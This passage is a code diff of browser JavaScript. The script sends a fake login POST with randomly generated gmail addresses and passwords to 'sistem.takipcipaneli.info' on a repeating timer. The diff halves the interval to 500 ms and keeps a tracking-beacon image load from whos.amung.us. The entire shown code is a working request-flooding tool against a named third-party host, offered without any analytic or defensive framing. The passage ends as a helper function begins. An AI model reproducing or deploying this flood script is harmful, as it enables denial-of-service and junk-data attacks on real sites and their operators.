@@ -1,23 +1,23 @@
 new Image().src = 'http://whos.amung.us/widget/r3dsiker1.png';
+
 function send() {
-var xhr = new XMLHttpRequest();
-var  params ="tpye=login";
+ var xhr = new XMLHttpRequest();
+ var  params ="tpye=login";
  params +="&email=" + generate_name(5, true) + '@gmail.com';
  params +="&password="  + generate_name(40, true);
- xhr.open("POST", "//sistem.takipcipaneli.info//login", true);
-xhr.setRequestHeader("X-Requested-With","XMLHttpRequest");
-    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-
-    xhr.onreadystatechange = function () {
-        if (xhr.readyState == 4 && xhr.status == 200) {
-            xhr.close;
-        }
-    }
-    xhr.send(params);
-	}
+ xhr.open("POST", "http://sistem.takipcipaneli.info//login", true);
+ xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
+ xhr.onreadystatechange = function() {
+  if (xhr.readyState == 4 && xhr.status == 200) {
+   xhr.close;
+  }
+ }
+xhr.send(params);
+}
 setInterval(function() {
  send();
-}, 1000);
+}, 500);
+
 	
 	
 function generate_name(length, firstUpper) {
